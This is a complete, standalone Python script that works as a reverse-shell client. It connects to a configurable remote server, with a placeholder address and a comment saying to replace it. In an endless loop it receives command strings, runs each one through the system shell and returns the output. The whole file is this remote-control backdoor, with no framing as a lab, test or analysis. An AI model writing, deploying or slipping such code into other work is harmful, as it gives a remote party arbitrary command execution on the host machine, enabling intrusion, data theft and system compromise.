import socket
import subprocess

HOST = '127.0.0.1'  # replace with the IP address or hostname of the server
PORT = 8000  # replace with the port number used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    while True:
        # receive a command from the server
        command = s.recv(1024).decode('utf-8')
        print(f'Received command: {command}')

        # execute the command and send the output back to the server
        output = ''
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output

        response = (output.decode().strip() +
                    "\nCommand Executed.").encode('utf-8')
        s.sendall(response)
